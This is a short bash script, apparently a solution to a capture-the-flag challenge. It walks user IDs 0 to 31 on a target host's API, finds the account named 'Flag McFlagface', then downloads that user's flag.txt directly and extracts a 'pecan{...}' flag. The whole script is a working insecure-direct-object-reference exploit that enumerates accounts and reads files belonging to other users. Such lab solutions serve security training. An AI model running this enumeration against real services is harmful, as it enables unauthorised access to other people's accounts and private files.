#!/bin/bash
for i in {0..31}
do
    if curl -s "http://${HOST}:8000/api/user/${i}/" | grep -q "Flag McFlagface"; then
        curl -s "http://${HOST}:8000/files/${i}/flag.txt" | grep -o -E '[pP][eE][cC][aA][nN]\{.+?\}'
        break
    fi
done
